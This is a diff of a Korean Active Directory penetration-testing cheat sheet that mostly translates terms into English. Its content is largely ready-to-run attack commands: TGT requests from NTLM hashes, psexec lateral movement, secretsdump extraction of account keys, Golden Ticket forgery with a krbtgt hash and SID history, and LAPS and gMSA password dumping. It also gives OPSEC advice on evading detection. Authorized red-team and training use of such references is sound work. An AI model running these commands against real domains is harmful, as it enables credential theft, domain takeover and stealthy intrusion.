@@ -37,9 +37,9 @@ Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LmCompatibil
 
 ## 인증 방식별 명령어 분기
 
-대부분의 Impacket, nxc 도구는 패스워드 / NTLM 해시 / Kerberos 티켓 세 가지 인증 방식을 지원한다. target 환경에 따라 적절한 방식을 선택한다.
+대부분의 Impacket, nxc 도구는 password / NTLM hash / Kerberos 티켓 세 가지 인증 방식을 지원한다. target 환경에 따라 적절한 방식을 선택한다.
 
-### 패스워드 인증 (기본)
+### password 인증 (기본)
 
 ```bash
 # Impacket 계열
@@ -125,7 +125,7 @@ echo "<dc_ip> <dc_fqdn> <domain>" | sudo tee -a /etc/hosts
 ```
 
 ```bash
-# TGT 획득 (패스워드로)
+# TGT 획득 (password로)
 impacket-getTGT <domain>/<user>:'<pass>' -dc-ip <dc_ip>
 
 # TGT 획득 (NTLM Hash로)
@@ -200,8 +200,8 @@ bloodhound-python -u <user> -d <domain> -dc <dc_fqdn> -c all \
 
 ## Overpass-the-Hash (Pass-the-Key)
 
-NTLM이 비활성화된 환경에서 NTLM 해시를 Kerberos TGT로 변환하여 사용하는 기법.
-NTLM 해시만 갖고 있지만 NTLM 인증이 차단된 경우에 유용하다.
+NTLM이 비활성화된 환경에서 NTLM hash를 Kerberos TGT로 변환하여 사용하는 기법.
+NTLM hash만 갖고 있지만 NTLM 인증이 차단된 경우에 유용하다.
 
 ```bash
 # NTLM Hash로 TGT 요청 → .ccache 파일 생성
@@ -223,7 +223,7 @@ impacket-psexec <domain>/<user>@<dc_fqdn> -k -no-pass
 ```
 
 !!! note "AES vs RC4"
-    RC4(NTLM 해시)로 TGT를 요청하면 downgrade 공격으로 탐지될 수 있다.
+    RC4(NTLM hash)로 TGT를 요청하면 downgrade 공격으로 탐지될 수 있다.
     AES256 키를 사용하면 정상 인증과 구분이 어려워 OPSEC 측면에서 유리하다.
     `impacket-secretsdump`에서 `-just-dc-user`로 특정 계정의 AES 키를 추출할 수 있다:
     `impacket-secretsdump '<domain>/<user>:<pass>@<dc_ip>' -just-dc-user <target>`
@@ -232,10 +232,10 @@ impacket-psexec <domain>/<user>@<dc_fqdn> -k -no-pass
 
 ## NTLM Relay
 
-NTLM 인증 요청을 중간에서 가로채 다른 서비스로 릴레이하는 공격.
+NTLM 인증 요청을 중간에서 가로채 다른 서비스로 relay하는 공격.
 
 !!! info "관련 문서"
-    프로토콜 자체 설명(NetNTLMv1/v2, 해시 유형, 보안 통제 매트릭스, 탐지 관점)은 [NTLM](../lifecycle/ntlm.md) 문서 참고. 강제 인증(Coercion) 기법은 [NTLM Coercion](coercion.md) 참고.
+    프로토콜 자체 설명(NetNTLMv1/v2, hash 유형, 보안 통제 매트릭스, 탐지 관점)은 [NTLM](../lifecycle/ntlm.md) 문서 참고. 강제 인증(Coercion) 기법은 [NTLM Coercion](coercion.md) 참고.
 
 ```mermaid
 sequenceDiagram
@@ -361,7 +361,7 @@ Get-ADTrust -Filter *
 impacket-lookupsid <domain>/<user>:<pass>@<other_dc_ip>
 
 # Inter-realm TGT 요청 (Golden Ticket + SID History)
-# 현재 도메인의 krbtgt 해시 + target 도메인의 SID로 TGT 위조
+# 현재 도메인의 krbtgt hash + target 도메인의 SID로 TGT 위조
 impacket-ticketer -nthash <krbtgt_hash> -domain-sid <current_sid> \
   -domain <current_domain> -extra-sid <target_domain_sid>-519 Administrator
 ```
@@ -386,11 +386,11 @@ Get-ADTrust -Filter * | Select-Object Name, Direction, TrustType
 |------|-----------|-----------|
 | SMB Signing | `nxc smb <ip>` | Relay 가능 여부 |
 | LDAP Signing | `nxc ldap <ip> -M ldap-checker` | LDAP Relay 가능 여부 |
-| NTLM 허용 여부 | `LmCompatibilityLevel` 레지스트리 | PtH 가능 여부 |
+| NTLM 허용 여부 | `LmCompatibilityLevel` Registry | PtH 가능 여부 |
 | Kerberos AES 지원 | Domain Functional Level 확인 | OPSEC (AES vs RC4) |
 | MachineAccountQuota | `nxc ldap <ip> -M maq` | RBCD 가능 여부 |
 | ADCS 존재 | `nxc ldap <ip> -M adcs` | ESC1~ESC16 |
-| Credential Guard | `DeviceGuardSecurityServicesConfigured` | lsass 덤프 불가 |
+| Credential Guard | `DeviceGuardSecurityServicesConfigured` | lsass dump 불가 |
 | LAPS | `nxc ldap <ip> -M laps` | 로컬 admin PW 관리 여부 |
 | gMSA | `nxc ldap <ip> -M gmsa` | 서비스 계정 PW 읽기 |
 | Protected Users | `net group "Protected Users" /domain` | PtH/위임 공격 불가 |
@@ -422,10 +422,10 @@ Get-ADGroupMember "Protected Users"
 
 ## LAPS (Local Administrator Password Solution)
 
-LAPS가 배포된 환경에서는 컴퓨터 객체의 `ms-Mcs-AdmPwd` 속성에 로컬 관리자 패스워드가 저장된다. 이 속성을 읽을 권한이 있으면 로컬 관리자 패스워드를 획득할 수 있다.
+LAPS가 배포된 환경에서는 컴퓨터 객체의 `ms-Mcs-AdmPwd` 속성에 로컬 관리자 password가 저장된다. 이 속성을 읽을 권한이 있으면 로컬 관리자 password를 획득할 수 있다.
 
 ```bash
-# nxc로 LAPS 패스워드 읽기
+# nxc로 LAPS password 읽기
 nxc ldap <dc_ip> -u <user> -p <pass> -M laps
 
 # ldapsearch로 직접 질의
@@ -437,12 +437,12 @@ ldapsearch -x -H ldap://<dc_ip> -D "<domain>\<user>" -w '<pass>' \
 
 ## gMSA (Group Managed Service Account)
 
-gMSA 계정의 패스워드는 AD에서 자동 관리되며, `msDS-GroupMSAMembership`에 지정된 주체만 읽을 수 있다.
+gMSA 계정의 password는 AD에서 자동 관리되며, `msDS-GroupMSAMembership`에 지정된 주체만 읽을 수 있다.
 
 ```bash
-# nxc로 gMSA 패스워드 읽기
+# nxc로 gMSA password 읽기
 nxc ldap <dc_ip> -u <user> -p <pass> -M gmsa
 
-# gMSA 해시 덤프
+# gMSA hash dump
 python3 gMSADumper.py -u <user> -p <pass> -d <domain>
 ```
